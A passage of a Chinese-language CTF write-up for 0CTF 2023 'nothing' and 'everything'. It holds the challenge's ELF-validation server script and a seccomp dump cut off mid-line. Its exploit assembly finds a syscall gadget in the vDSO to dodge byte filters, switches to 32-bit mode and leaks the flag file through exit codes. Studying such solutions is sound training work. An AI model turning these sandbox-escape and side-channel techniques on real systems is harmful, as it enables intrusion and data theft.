[rdi],0x21<br>    je      find_vdso_l2<br>    add     rdi,0x8<br>    jmp     find_vdso_l1<br>find_vdso_l2: <br>    mov     r15, QWORD [rdi+0x8] ; r15 store vdso address, will be page aligned<br>    mov     rax, r15<br>; search for `syscall; ret` in vdso<br>find_syscall_ret_l1:<br>    cmp    BYTE [rax],0xf<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x1],0x5<br>    jne    find_syscall_ret_l2<br>    cmp    BYTE [rax+0x2],0x31<br>    je     find_syscall_ret_l3<br>find_syscall_ret_l2:<br>    inc    rax<br>    jmp    find_syscall_ret_l1<br>find_syscall_ret_l3:<br>    mov     r14, rax            ; r14: syscall; ret<br><br><br>open_flag:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    lea     rsi, [flag]<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;flag&quot;, 0) -&gt; fd 3<br><br>open_elf:<br>    mov     edi, 0x31337    ; ld script will ensure 0x31337 is mapped and RW<br>    mov     rsi, r13<br>    call    strcpy<br>    <br>    mov     edi, 0x31337<br>    xor     rsi, rsi<br>    mov     eax, 2<br>    call    r14             ; open(&quot;ELF_FILE&quot;, 0) -&gt; fd 4<br>; enter 32 bit<br>    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    call    retf_to_32<br><br>flag:       db          &quot;flag&quot;, 0<br>message:    db          &quot;test output!!!!!&quot;, 0<br>sc:         db          0x90, 0x90<br>sc_len:     dq          2<br>section     .bss noexec<br>    align 16<br>pad:        resb        0x1000<br>stack:      resb        0x1000<br></code></pre></td></tr></table></figure><p>跳来跳去的很乱，按标签标记</p><ul><li><p>_start</p><p>在envp中找正在执行的elf的路径（r13），在vdso中找syscall（r14）</p></li><li><p>open_flag</p><ul><li><p>由于open需要filename地址为0x31337，所以调用strcpy将flag字符串复制到0x31337</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/strcpy.png" class title="strcpy"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs assembly">strcpy:<br>    cld; 将方向标志位（DF）清零，字符串处理指令递增地址<br>cpy1:<br>    lodsb; 加载字节，将字节从源地址加载到累加器 AL 中<br>    stosb; 存储字节，将累加器 AL 中的字节存储到目的地址<br>    test al,al; 遇到空字节结束<br>    jne cpy1<br>    ret<br></code></pre></td></tr></table></figure></li><li><p>打开flag</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open1.png" class title="open1} * open_elf * 将elf路径复制到0x31337，打开elf文件 {% asset_img openelf.png openelf"></li><li><p>切换至32位，编译时预留好了rw权限的栈，切换完成后执行start_32</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs assembly">    mov     edx, r15d ; clear high 32 bit vdso addr<br>    mov     rsp, stack<br>    mov     rdi, start_32<br>    <br>    ……<br>    <br>retf_to_32:<br>; switch to 32 bit<br>    push    0x23            ; cs<br>    push    rdi             ; ip<br>    retfq                   ; jump to rdi<br></code></pre></td></tr></table></figure><p>这时vdso的低32位地址已经被保存到了edx中</p></li></ul></li><li><p>start_32</p><ul><li><p>利用sysenter将当前elf文件mmap到vdso低32位地址处，因为sysenter返回后会回到vdso return address的低32位地址（6个参数栈传参）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs assembly">_sysenter:<br>    push    ecx             ; push   ecx<br>    push    edx             ; push   edx<br>    push    ebp             ; push   ebp<br>    mov     ebp, esp<br>    sysenter<br><br>start_32:<br>mmap_elf_to_vdso:<br>    push    0x1000          ; off: 0x1000 : .text start<br>    push    4               ; fd: 4, elf file<br>    push    0x11            ; flags: MAP_FIXED | MAP_SHARED<br>    push    5               ; prot: RX<br>    push    0x4000          ; length: elf size<br>    push    edx             ; addr: vdso return addr &amp;&amp; elf base<br>    mov     ebx, esp<br>    mov     eax, 0x5a       ; mmap<br>    call    _sysenter<br></code></pre></td></tr></table></figure><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/sysentermmap.png" class title="sysentermmap"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap.png" class title="vmmap"><p>跑飞哩~</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/fly.png" class title="fly"><p>着陆！</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">vdso_landing:<br>    times 4096 db 0x90      ; nop padding<br>    pop     ebp<br>    pop     edx<br>    pop     ecx<br>    ret<br></code></pre></td></tr></table></figure></li><li><p>然后就是rw然后退出</p></li></ul></li></ul><p>再重新看一下linker.ld</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.data : &#123; *(.data) &#125;<br><br>.bss : &#123; *(.bss) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>需要</p><ul><li>open时&amp;filename &#x3D;&#x3D; 0x31337，所以需要调整加载基地址达到这个要求</li><li>之后要把elf映射到vdso低地址处，所以代码段在较低的位置</li></ul><h3 id="侧信道"><a href="#侧信道" class="headerlink" title="侧信道"></a>侧信道</h3><p>server.py会输出程序返回值，所以打开flag后mmap到内存里，exit flag的每个字节</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c">SECTIONS<br><br>&#123;<br><br>. = <span class="hljs-number">0x2f000</span>;<br><br>.text : &#123; *(.text) &#125;<br><br>. = <span class="hljs-number">0x31000</span>;<br><br>.bss : &#123; *(.bss) &#125;<br><br>.data : &#123; *(.data) &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs assembly">[BITS 64]<br>; compile with: nasm -f elf64 exp.s -o exp.o &amp;&amp; ld exp.o -e _start -o exp -T linker.ld<br>global _start<br>section.text exec<br>_start:<br>  ; try to find vdso<br>  ; mov rcx, 0<br>mov rbx, rsp<br>get_vdso_base:<br>add rbx, 8<br>mov r15, [rbx]<br>cmp r15, 0x21<br>jne get_vdso_base<br>mov rbx, [rbx+8]<br><br>get_syscall:<br>add rbx, 1<br>mov r15, [rbx]<br>and r15, 0xffffff<br>cmp r15, 0xc3050e<br>jl get_syscall<br>cmp r15, 0xc30510<br>jg get_syscall<br> ; save syscall<br>mov r15, rbx<br> ; open<br>mov rax, 2<br>mov rdi, 0x31337<br>mov rsi, 0<br>mov rdx, 0<br>call r15<br> ; mmap<br>mov r8, rax<br>mov r9, 0<br>mov r10, 2<br>mov rax, 9<br>mov rdi, 0xdead000<br>mov rsi, 0x1000<br>mov rdx, 2<br>call r15<br>mov rdi, [0xdead000] ; 0xdead0001!!3<br> ; mov rdi, 137<br>mov rax, 0x3c<br>call r15<br><br>section   .bss noexec<br>pad:        resb        0x337<br><br>section.data noexec<br>flag:     db      &quot;flag&quot;, 0<br></code></pre></td></tr></table></figure><ul><li><p>找vdso</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findvdso.png" class title="findvdso"></li><li><p>找syscall</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/findsyscall.png" class title="findsyscall"></li><li><p>open，mmap，然后exit flag每个字节</p><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/open111.png" class title="open111"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/mmapppp.png" class title="mmapppp"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/vmmap1.png" class title="vmmap1"><img src="/2024/01/21/%E6%9C%89%E5%8D%B3%E6%98%AF%E6%97%A0%E6%97%A0%E5%8D%B3%E6%98%AF%E6%9C%89/exit.png" class title="exit"></li></ul><h1 id="2023-0CTF-everything"><a href="#2023-0CTF-everything" class="headerlink" title="2023 0CTF everything"></a>2023 0CTF everything</h1><h2 id="server-py-2"><a href="#server-py-2" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3 -u</span><br><br><span class="hljs-keyword">import</span> os, sys, random, subprocess, gmpy2<br><span class="hljs-keyword">from</span> io <span class="hljs-keyword">import</span> BytesIO<br><span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> sha3_256<br><span class="hljs-keyword">from</span> elftools.elf.elffile <span class="hljs-keyword">import</span> ELFFile<br><span class="hljs-keyword">from</span> elftools.elf.constants <span class="hljs-keyword">import</span> P_FLAGS<br><br>os.chdir(os.path.dirname(__file__))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">proof_of_work</span>(<span class="hljs-params">sec = <span class="hljs-number">10</span></span>):<br>    <span class="hljs-comment"># From 0CTF/TCTF 2021 &quot;checkin&quot;</span><br>    p = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    q = gmpy2.next_prime(random.getrandbits(<span class="hljs-number">512</span>))<br>    n = p*q<br>    c = <span class="hljs-number">2900000</span><br>    t = c*sec + random.randint(<span class="hljs-number">0</span>,c)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Show me your computation:&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;2^(2^<span class="hljs-subst">&#123;t&#125;</span>) mod <span class="hljs-subst">&#123;n&#125;</span> = ?&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Your answer: &#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        sol = <span class="hljs-built_in">int</span>(sys.stdin.readline())<br>        phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)<br>        u = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, t, phi)<br>        w = <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, u, n)<br>        <span class="hljs-keyword">if</span> w == sol:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Correct!&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Wrong Answer!&#x27;</span>)<br>            exit()<br>    <span class="hljs-keyword">except</span> ValueError:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid Input!&#x27;</span>)<br>        exit()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_bytes</span>(<span class="hljs-params">data, b</span>):<br>    p = -<span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        p = data.find(b, p+<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">if</span> p == -<span class="hljs-number">1</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">elif</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> p &amp; <span class="hljs-number">0xfff</span> == <span class="hljs-number">0xfff</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_segments</span>(<span class="hljs-params">elf</span>):<br>    <span class="hljs-keyword">for</span> seg <span class="hljs-keyword">in</span> elf.iter_segments():<br>        <span class="hljs-keyword">if</span> seg.header.p_filesz &gt; <span class="hljs-number">0x10000</span> <span class="hljs-keyword">or</span> seg.header.p_memsz &gt; <span class="hljs-number">0x10000</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Segment too large&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_INTERP&#x27;</span> <span class="hljs-keyword">or</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_DYNAMIC&#x27;</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No dynamic link&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_LOAD&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_W <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;W^X&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">elif</span> seg.header.p_type == <span class="hljs-string">&#x27;PT_GNU_STACK&#x27;</span> <span class="hljs-keyword">and</span> seg.header.p_flags &amp; P_FLAGS.PF_X:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;No executable stack&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">check_elf</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) &lt; <span class="hljs-number">0x34</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> data.startswith(<span class="hljs-string">b&#x27;\x7fELF\x01\x01\x01&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">9</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid ELF Magic&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\xcd\x80&#x27;</span> <span class="hljs-keyword">in</span> data <span class="hljs-keyword">or</span> <span class="hljs-string">b&#x27;\x0f\x05&#x27;</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\xcd&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x80&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x0f&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">not</span> check_bytes(data, <span class="hljs-string">b&#x27;\x05&#x27;</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad Instruction&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    elf = ELFFile(BytesIO(data))<br>    <span class="hljs-keyword">if</span> ((elf.header.e_type != <span class="hljs-string">&#x27;ET_EXEC&#x27;</span> <span class="hljs-keyword">and</span> elf.header.e_type != <span class="hljs-string">&#x27;ET_DYN&#x27;</span>)<br>        <span class="hljs-keyword">or</span> elf.header.e_version != <span class="hljs-string">&#x27;EV_CURRENT&#x27;</span><br>        <span class="hljs-keyword">or</span> elf.header.e_ehsize != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phoff != <span class="hljs-number">0x34</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &lt;= <span class="hljs-number">0</span><br>        <span class="hljs-keyword">or</span> elf.header.e_phnum &gt;= <span class="hljs-number">100</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad ELF Header&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>    <span class="hljs-keyword">return</span> check_segments(elf)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">try</span>:<br>        size = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&#x27;Size of your ELF: &#x27;</span>))<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> size &lt;= <span class="hljs-number">0</span> <span class="hljs-keyword">or</span> size &gt; <span class="hljs-number">0x10000</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bad size!&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;ELF File:&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        data = sys.stdin.buffer.read(size)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Invalid file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(data) != size:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Incomplete file data&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Received: %d bytes&#x27;</span> % <span class="hljs-built_in">len</span>(data))<br>    <span class="hljs-keyword">if</span> check_elf(data):<br>        filename = sha3_256(data).hexdigest()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;File Hash: <span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>)<br>        path = <span class="hljs-string">f&#x27;./data/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span><br>        <span class="hljs-keyword">if</span> os.path.exists(path):<br>            os.unlink(path)<br>        <span class="hljs-built_in">open</span>(path, <span class="hljs-string">&#x27;wb&#x27;</span>).write(data)<br>        os.chmod(path, <span class="hljs-number">0o555</span>)<br>        <span class="hljs-keyword">try</span>:<br>            p = subprocess.Popen([<span class="hljs-string">&#x27;docker&#x27;</span>, <span class="hljs-string">&#x27;run&#x27;</span>, <span class="hljs-string">&#x27;-i&#x27;</span>, <span class="hljs-string">&#x27;--rm&#x27;</span>, <span class="hljs-string">&#x27;-v&#x27;</span>, <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;path&#125;</span>:/chroot/<span class="hljs-subst">&#123;filename&#125;</span>&#x27;</span>, <span class="hljs-string">&#x27;tctf/launcher32:2023&#x27;</span>, filename], stdin=subprocess.DEVNULL, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)<br>            p.wait()<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Return status: %d&#x27;</span> % p.returncode)<br>            <span class="hljs-keyword">if</span> p.returncode == <span class="hljs-number">137</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Output:&#x27;</span>)<br>                sys.stdout.buffer.write(p.stdout.read())<br>                <span class="hljs-keyword">return</span><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    <span class="hljs-keyword">if</span> proof_of_work():<br>        main()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Bye!&#x27;</span>)<br></code></pre></td></tr></table></figure><p>比nothing多了一个通过e_ident要求32位的判断</p><h2 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"> line  CODE  JT   JF      K<br>=================================<br> <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch<br> <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x1b</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A != ARCH_X86_64) <span class="hljs-keyword">goto</span> <span class="hljs-number">0029</span><br> <span class="hljs-number">0002</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number<br> <span class="hljs-number">0003</span>: <span class="hljs-number">0x35</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x40000000</span>  <span class="hljs-keyword">if</span> (A &lt; <span class="hljs-number">0x40000000</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0005</span><br> <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x22</span> <span class="hljs-number">0xffffffff</span>  <span class="hljs-keyword">if</span> (A != <span class="hljs-number">0xffffffff</span>) <span class="hljs-keyword">goto</span> <span class="hljs-number">0039</span><br> <span class="hljs-number">0005</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A == close) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1f</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000b</span>  <span class="hljs-keyword">if</span> (A == munmap) <span class="hljs-keyword">goto</span> <span class="hljs-number">0038</span><br> <span class="hljs-number">0007</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x1e</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A == brk) <span class="hljs-keyword">goto</span> <span 